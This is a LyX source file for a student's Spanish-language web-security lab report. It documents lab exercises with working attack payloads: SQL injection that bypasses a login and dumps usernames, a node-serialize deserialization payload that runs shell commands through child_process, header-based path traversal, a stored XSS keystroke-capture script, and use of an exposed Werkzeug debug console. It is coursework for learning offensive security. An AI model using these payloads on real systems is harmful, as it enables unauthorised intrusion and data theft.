@@ -1,0 +1,1169 @@
+#LyX 2.3 created this file. For more info see http://www.lyx.org/
+\lyxformat 544
+\begin_document
+\begin_header
+\save_transient_properties true
+\origin unavailable
+\textclass article
+\begin_preamble
+\usepackage{xcolor}
+\usepackage{listings}
+\lstset{basicstyle=\ttfamily,
+  showstringspaces=false,
+  commentstyle=\color{red},
+  keywordstyle=\color{blue}
+}
+\end_preamble
+\use_default_options true
+\maintain_unincluded_children false
+\language english
+\language_package default
+\inputencoding auto
+\fontencoding global
+\font_roman "default" "default"
+\font_sans "default" "default"
+\font_typewriter "default" "default"
+\font_math "auto" "auto"
+\font_default_family default
+\use_non_tex_fonts false
+\font_sc false
+\font_osf false
+\font_sf_scale 100 100
+\font_tt_scale 100 100
+\use_microtype false
+\use_dash_ligatures true
+\graphics default
+\default_output_format default
+\output_sync 0
+\bibtex_command default
+\index_command default
+\paperfontsize default
+\spacing single
+\use_hyperref false
+\papersize default
+\use_geometry false
+\use_package amsmath 1
+\use_package amssymb 1
+\use_package cancel 1
+\use_package esint 1
+\use_package mathdots 1
+\use_package mathtools 1
+\use_package mhchem 1
+\use_package stackrel 1
+\use_package stmaryrd 1
+\use_package undertilde 1
+\cite_engine basic
+\cite_engine_type default
+\biblio_style plain
+\use_bibtopic false
+\use_indices false
+\paperorientation portrait
+\suppress_date true
+\justification true
+\use_refstyle 1
+\use_minted 0
+\index Index
+\shortcut idx
+\color #008000
+\end_index
+\secnumdepth 3
+\tocdepth 3
+\paragraph_separation indent
+\paragraph_indentation default
+\is_math_indent 0
+\math_numbering_side default
+\quotes_style english
+\dynamic_quotes 0
+\papercolumns 1
+\papersides 1
+\paperpagestyle default
+\tracking_changes false
+\output_changes false
+\html_math_output 0
+\html_css_as_file 0
+\html_be_strict false
+\end_header
+
+\begin_body
+
+\begin_layout Title
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+underline{Práctica 2 : Seguridad Web}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Author
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+underline{Alumno:Pablo Alonso}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Subsection*
+1)
+\end_layout
+
+\begin_layout Subsection*
+a-
+\end_layout
+
+\begin_layout Standard
+Al provocar un error en la consulta sql, por ejemplo con 
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+bob' UNION SELECT NULL
+\end_layout
+
+\end_inset
+
+, se presenta un Traceback y al seleccionar una linea de código accedemos
+ al código fuente.
+ Leyendo el código fuente se inyecta el siguiente fragmento de consulta
+ para vulnerar el login ingresando lo siguiente en el username:
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{lstlisting}[language=sql,caption={}]
+\end_layout
+
+\begin_layout Plain Layout
+
+dafd' UNION SELECT 1,
+\end_layout
+
+\begin_layout Plain Layout
+
+'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb','' --
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{lstlisting}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+En la password se ingresa solo 'a' y se accede al secreto de bob: i have
+ no secrets .
+\end_layout
+
+\begin_layout Subsection*
+b-
+\end_layout
+
+\begin_layout Standard
+El servidor lanza una excepción si el user_id devuelto por la consulta no
+ se trata de una clave en el diccionario que guarda los secretos, en el
+ cual se imprime el resultado de la consulta.
+ Aprovechando eso, se puede inyectar el siguiente código a travez del username:
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{lstlisting}[language=sql,caption={}]
+\end_layout
+
+\begin_layout Plain Layout
+
+dfas' UNION SELECT 
+\end_layout
+
+\begin_layout Plain Layout
+
+(SELECT COUNT(id) FROM(users),
+\end_layout
+
+\begin_layout Plain Layout
+
+'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb',
+\end_layout
+
+\begin_layout Plain Layout
+
+'' --
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{lstlisting}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Nuevamente se ingresa 'a' como password y se imprime lo siguiente: KeyError
+ '6', 6 corresponde al resultado de la consulta SELECT COUNT(id) FROM(users).
+\end_layout
+
+\begin_layout Subsection*
+c-
+\end_layout
+
+\begin_layout Standard
+Aprovechando lo anterior, se inyecta:
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{lstlisting}[language=sql,caption={}]
+\end_layout
+
+\begin_layout Plain Layout
+
+asdf' UNION SELECT
+\end_layout
+
+\begin_layout Plain Layout
+
+(SELECT GROUP_CONCAT(username) FROM users), 
+\end_layout
+
+\begin_layout Plain Layout
+
+'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb',''
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{lstlisting}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Y surge una KeyError exception: KeyError: 'cacho,bob,john,mallory,eve,kisio'.
+\end_layout
+
+\begin_layout Standard
+'cacho,bob,john,mallory,eve,kisio' corresponde al resultado de SELECT GROUP_CONC
+AT(username) FROM users.
+\end_layout
+
+\begin_layout Subsection*
+2)
+\end_layout
+
+\begin_layout Subsection*
+a-
+\end_layout
+
+\begin_layout Standard
+Se utiliza Javascript del lado del servidor.
+\end_layout
+
+\begin_layout Subsection*
+b-
+\end_layout
+
+\begin_layout Standard
+Al ingresar por primera vez el sitio no muestra nada interesante.
+ Si se refresca surge un error del tipo 
+\begin_inset Quotes eld
+\end_inset
+
+SyntaxError: Unexpected token F in JSON at position 79 at JSON.parse
+\begin_inset Quotes erd
+\end_inset
+
+.
+ Es decir que se está mandando información al servidor web en forma de objeto
+ JSON y este intenta deserializarlo para transformarlo en un objeto Javascript.
+ Al interceptar un paquete con Burp Suite se observa que el servidor asigna
+ una cookie al navegador.
+ El token de la cookie es:
+\end_layout
+
+\begin_layout Standard
+eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZn
+\end_layout
+
+\begin_layout Standard
+MzNGdnZGdjaGp3bnphMGw9IiwiRXhwaXJlcz0iOkZyaWRheSwgMTMgT2N0IDIwM
+\end_layout
+
+\begin_layout Standard
+TggMDA6MDA6MDAgR01UIn0%3D.
+\end_layout
+
+\begin_layout Standard
+Dado que '%3D' es '=' encodeado en URL encoding se reemplaza y decodifica
+ en base64:
+\end_layout
+
+\begin_layout Standard
+{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":F
+riday, 13 Oct 2018 00:00:00 GMT"}
+\end_layout
+
+\begin_layout Standard
+Observar que la falta de 
+\begin_inset Quotes eld
+\end_inset
+
+ en Friday explica el error con el que resonde el servidor.
+ Esto da el indició de que lo que se intenta deserializar a objeto Javascript
+ es el token decodificado que se pasa como Cookie.
+ Se codifica el siguiente JSON en base64 y se envia como cookie:
+\end_layout
+
+\begin_layout Standard
+{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":"
+Friday, 13 Oct 2018 00:00:00 GMT"}
+\end_layout
+
+\begin_layout Standard
+La respuesta es 
+\begin_inset Quotes eld
+\end_inset
+
+Hello Admin
+\begin_inset Quotes erd
+\end_inset
+
+, es decir que dentro de la aplicación se invoca al atributo username.
+\end_layout
+
+\begin_layout Subsection*
+c-
+\end_layout
+
+\begin_layout Standard
+Una forma de explotar la vulnerabilidad encontrada es pasar como valor de
+ username una función que se termine ejecutando del lado del servidor, para
+ conseguir el token que vamos a pasar como cookie se ejecuta el siguiente
+ código javascript:
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+lstdefinelanguage{javascript}{   keywords={typeof, new, true, false, catch,
+ function, return, null, catch, switch, var, if, in, while, do, else, case,
+ break},   keywordstyle=
+\backslash
+color{blue}
+\backslash
+bfseries,   ndkeywords={class, export, boolean, throw, implements, import,
+ this},   ndkeywordstyle=
+\backslash
+color{darkgray}
+\backslash
+bfseries,   identifierstyle=
+\backslash
+color{black},   sensitive=false,   comment=[l]{//},   morecomment=[s]{/*}{*/},
+   commentstyle=
+\backslash
+color{purple}
+\backslash
+ttfamily,   stringstyle=
+\backslash
+color{red}
+\backslash
+ttfamily,   morestring=[b]',   morestring=[b]" }
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+lstset{    language=JavaScript,    backgroundcolor=
+\backslash
+color{lightgray},    extendedchars=true,    basicstyle=
+\backslash
+footnotesize
+\backslash
+ttfamily,    showstringspaces=false,    showspaces=false,    numbers=none,
+    numberstyle=
+\backslash
+footnotesize,    numbersep=9pt,    tabsize=2,    breaklines=true,    showtabs=fa
+lse,    captionpos=b } 
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{lstlisting}[language=javaScript,caption={}]
+\end_layout
+
+\begin_layout Plain Layout
+
+var comm = 'cat server.js'
+\end_layout
+
+\begin_layout Plain Layout
+
+var y = {	
+\end_layout
+
+\begin_layout Plain Layout
+
+    username: function(){
+\end_layout
+
+\begin_layout Plain Layout
+
+          var execSync = require('child_process').execSync;
+\end_layout
+
+\begin_layout Plain Layout
+
+          return execSync(comm, { encoding: 'utf-8' });
+\end_layout
+
+\begin_layout Plain Layout
+
+    },
+\end_layout
+
+\begin_layout Plain Layout
+
+      
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\begin_layout Plain Layout
+
+var serialize = require('node-serialize'); 
+\end_layout
+
+\begin_layout Plain Layout
+
+console.log("Serialized:" + serialize.serialize(y));
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{lstlisting}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Obtenemos el siguiente JSON:
+\end_layout
+
+\begin_layout Standard
+{
+\begin_inset Quotes eld
+\end_inset
+
+username
+\begin_inset Quotes erd
+\end_inset
+
+: "_$$ND_FUNC$$_function (){ var execSync = require('child_process').execSync;ret
+urn execSync('cat server.js', { encoding: 'utf-8' }) }()" }
+\end_layout
+
+\begin_layout Standard
+Se encodea en base64 y se lo agrega como cookie.
+ Luego cuando la aplicación procesa esta request termina ejecutando el comando
+ pasado.
+\end_layout
+
+\begin_layout Subsection*
+3)
+\end_layout
+
+\begin_layout Subsection*
+a- 
+\end_layout
+
+\begin_layout Standard
+La apicación es vulnerable a sql injection a trávez del parámetro id que
+ se pasa por GET.
+ Esto es comprobable al percibir respuestas distintas al agregar junto con
+ el id fragmentos de consultas del tipo and o union.
+\end_layout
+
+\begin_layout Subsection*
+b-
+\end_layout
+
+\begin_layout Standard
+Se puede obtener el código de la aplicación ya que la consulta que se realiza
+ con el parámetro id retorna la ruta del archivo.
+ Entonces mandando 
+\begin_inset Quotes eld
+\end_inset
+
+id=9 UNION SELECT alguna_ruta
+\begin_inset Quotes erd
+\end_inset
+
+ se puede leer cualquier contenido dentro de la aplicación.
+ El único problema es que no se conoce los nombres de los archivos de la
+ aplicación entonces hacemos uso de la tool intruder de BurpSuite para hacer
+ un ataque por diccionario hasta dar con el nombre de algún archivo dentro
+ de la aplicación.
+ Finalmente se logra dar con main.py y se encuentra la FLAG:
+\begin_inset Quotes erd
+\end_inset
+
+SEGURIDAD-OFENSIVA-FAMAF
+\begin_inset Quotes erd
+\end_inset
+
+.
+\end_layout
+
+\begin_layout Subsection*
+4)
+\end_layout
+
+\begin_layout Subsection*
+a-
+\end_layout
+
+\begin_layout Standard
+Usando Burp Suite, podríamos capturar una request como esta:
+\end_layout
+
+\begin_layout Standard
+GET / HTTP/1.1
+\end_layout
+
+\begin_layout Standard
+Host: 143.0.100.198:5010 
+\end_layout
+
+\begin_layout Standard
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+\end_layout
+
+\begin_layout Standard
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
+\end_layout
+
+\begin_layout Standard
+Accept-Language: en-US,en;q=0.5 
+\end_layout
+
+\begin_layout Standard
+Accept-Encoding: gzip, deflate
+\end_layout
+
+\begin_layout Standard
+Connection: close
+\end_layout
+
+\begin_layout Standard
+Upgrade-Insecure-Requests: 1
+\end_layout
+
+\begin_layout Standard
+Cache-Control: max-age=0 
+\end_layout
+
+\begin_layout Standard
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Y modificarla de la siguiente manera:
+\end_layout
+
+\begin_layout Standard
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+GET / HTTP/1.1
+\end_layout
+
+\begin_layout Standard
+Host: 143.0.100.198:5010 
+\end_layout
+
+\begin_layout Standard
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+\end_layout
+
+\begin_layout Standard
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
+\end_layout
+
+\begin_layout Standard
+Accept-Language: ....//what_i_want
+\end_layout
+
+\begin_layout Standard
+Accept-Encoding: gzip, deflate
+\end_layout
+
+\begin_layout Standard
+Connection: close
+\end_layout
+
+\begin_layout Standard
+Upgrade-Insecure-Requests: 1
+\end_layout
+
+\begin_layout Standard
+Cache-Control: max-age=0 
+\end_layout
+
+\begin_layout Standard
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Basta reemplazar what_i_want para escaparse de la carpeta lang e incluir
+ otros archivos locales del servidor dentro del script.
+ 
+\end_layout
+
+\begin_layout Standard
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Subsection*
+b-
+\end_layout
+
+\begin_layout Standard
+Un script mas adecuado seria:
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+lstset{   language        = php,   basicstyle      = 
+\backslash
+small
+\backslash
+ttfamily,   keywordstyle    = 
+\backslash
+color{dkblue},   stringstyle     = 
+\backslash
+color{red},   identifierstyle = 
+\backslash
+color{dkgreen},   commentstyle    = 
+\backslash
+color{gray},   emph            =[1]{php},   emphstyle       =[1]
+\backslash
+color{black},   emph            =[2]{if,and,or,else},   emphstyle      
+ =[2]
+\backslash
+color{dkyellow}}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+lstset{    language=php,    backgroundcolor=
+\backslash
+color{lightgray},    extendedchars=true,    basicstyle=
+\backslash
+footnotesize
+\backslash
+ttfamily,    showstringspaces=false,    showspaces=false,    numbers=none,
+    numberstyle=
+\backslash
+footnotesize,    numbersep=9pt,    tabsize=2,    breaklines=true,    showtabs=fa
+lse,    captionpos=b } 
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{lstlisting}[language=javaScript,caption={}]
+\end_layout
+
+\begin_layout Plain Layout
+
+<?php class LangMgr{ 
+\end_layout
+
+\begin_layout Plain Layout
+
+       public function newLang(){ 
+\end_layout
+
+\begin_layout Plain Layout
+
+            $lang = $this->getBrowserLang();
+\end_layout
+
+\begin_layout Plain Layout
+
+            $sanitizedLang = $this->sanitizeLang($lang);
+\end_layout
+
+\begin_layout Plain Layout
+
+            require_once("/lang/$sanitizedLang");
+\end_layout
+
+\begin_layout Plain Layout
+
+       }
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+       private function getBrowserLang(){
+\end_layout
+
+\begin_layout Plain Layout
+
+            $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en';
+\end_layout
+
+\begin_layout Plain Layout
+
+            return $lang;
+\end_layout
+
+\begin_layout Plain Layout
+
+       }
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+      private function sanitizeLang($lang){
+\end_layout
+
+\begin_layout Plain Layout
+
+            return substr($lang,2);
+\end_layout
+
+\begin_layout Plain Layout
+
+      }
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+(new LangMgr())->newLang(); ?>
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{lstlisting}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Subsection*
+5)
+\end_layout
+
+\begin_layout Standard
+El tipo de ataque que se lleva a cabo sobre la máquina owaspbwa es del tipo
+ XSS Stored.
+ Se observa que una base de tados almacena el nombre y el mensaje ingresados
+ y que la aplicación los agrega en el html de respuesta tal cual se ingresan.
+ La idea es insertar un script como el que se describe a continuación:
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+lstdefinelanguage{javascript}{   keywords={typeof, new, true, false, catch,
+ function, return, null, catch, switch, var, if, in, while, do, else, case,
+ break},   keywordstyle=
+\backslash
+color{blue}
+\backslash
+bfseries,   ndkeywords={class, export, boolean, throw, implements, import,
+ this},   ndkeywordstyle=
+\backslash
+color{darkgray}
+\backslash
+bfseries,   identifierstyle=
+\backslash
+color{black},   sensitive=false,   comment=[l]{//},   morecomment=[s]{/*}{*/},
+   commentstyle=
+\backslash
+color{purple}
+\backslash
+ttfamily,   stringstyle=
+\backslash
+color{red}
+\backslash
+ttfamily,   morestring=[b]',   morestring=[b]" }
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+lstset{    language=JavaScript,    backgroundcolor=
+\backslash
+color{lightgray},    extendedchars=true,    basicstyle=
+\backslash
+footnotesize
+\backslash
+ttfamily,    showstringspaces=false,    showspaces=false,    numbers=none,
+    numberstyle=
+\backslash
+footnotesize,    numbersep=9pt,    tabsize=2,    breaklines=true,    showtabs=fa
+lse,    captionpos=b } 
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{lstlisting}[language=javaScript,caption={}]
+\end_layout
+
+\begin_layout Plain Layout
+
+<script>
+\end_layout
+
+\begin_layout Plain Layout
+
+var i = 0;
+\end_layout
+
+\begin_layout Plain Layout
+
+document.getElementsByTagName("textarea")[0].onkeypress=function(){
+\end_layout
+
+\begin_layout Plain Layout
+
+alert(i);i++;};
+\end_layout
+
+\begin_layout Plain Layout
+
+</script>
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{lstlisting}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Dado que el textarea que ofrece el sitio acepta una pequeña cantidad de
+ carácteres, se hace uso de los comentarios para trozar el script en pequeños
+ fragmentos y poder ingresarlo al sistema de la aplicación.
+ Entonces se ingresan nombres y mensajes como los que siguen:
+\end_layout
+
+\begin_layout Standard
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+nombre:1
+\end_layout
+
+\begin_layout Standard
+mensaje:<script>/*
+\end_layout
+
+\begin_layout Standard
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+nombre:2
+\end_layout
+
+\begin_layout Standard
+mensaje:*/var i = 0;/*
+\end_layout
+
+\begin_layout Standard
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+nombre:3
+\end_layout
+
+\begin_layout Standard
+mensaje:*/document./*
+\end_layout
+
+\begin_layout Standard
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+nombre:4
+\end_layout
+
+\begin_layout Standard
+mensaje:*/getElementsByTagName("textarea")[0]/*
+\end_layout
+
+\begin_layout Standard
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+nombre:5
+\end_layout
+
+\begin_layout Standard
+mensaje:*/.onkeypress=function()/*
+\end_layout
+
+\begin_layout Standard
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+nombre:6
+\end_layout
+
+\begin_layout Standard
+mensaje:*/{alert(i);i++;};/*
+\end_layout
+
+\begin_layout Standard
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+nombre:7
+\end_layout
+
+\begin_layout Standard
+mensaje:*/</script>
+\end_layout
+
+\begin_layout Standard
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Y se logra capturar el evento de que el usuario de la aplicación pulse una
+ tecla.
+\end_layout
+
+\begin_layout Subsection*
+6)
+\end_layout
+
+\begin_layout Subsection*
+a-
+\end_layout
+
+\begin_layout Standard
+Flag:ThIs_Even_PaSsED_c0d3_rewVIEW
+\end_layout
+
+\begin_layout Subsection*
+b-
+\end_layout
+
+\begin_layout Standard
+Se observa en el header server que la tecnología que se usa en el servidor
+ web es Werkzeug 0.10.4.
+ Investigando esta tecnología se descubre que la versión contiene reportes
+ de varias vulnerabilidades: SharedDataMiddleware y XSS.
+ Además esta tecnología tiene un debuguer que permite abrir una consola
+ python en la aplicación web la cuál puede ejecutar codigo arbitrario dentro
+ del contexto de la aplicación web.
+ Se invoca dicha consola en http://143.0.100.198:5001/console y se observa
+ que la misma se encuentra disponible .
+ Una vez dentro de la consola se imprime el código de la aplicación y se
+ observa la siguiente linea de código:
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{lstlisting}[language=python,caption={}]
+\end_layout
+
+\begin_layout Plain Layout
+
+ app.run(debug=True, host="0.0.0.0", port=1337)
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{lstlisting}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+En resumen, el error es que se esta corriendo la aplicación web dentro de
+ un servidor de producción con la bandera de debug encencida y esto habilita
+ una consola dentro de la aplicación disponible para cualquier intruso.
+\end_layout
+
+\begin_layout Standard
+Otra alternativa para encontrar esta vulnerabilidad es con dirbuster.
+\end_layout
+
+\end_body
+\end_document
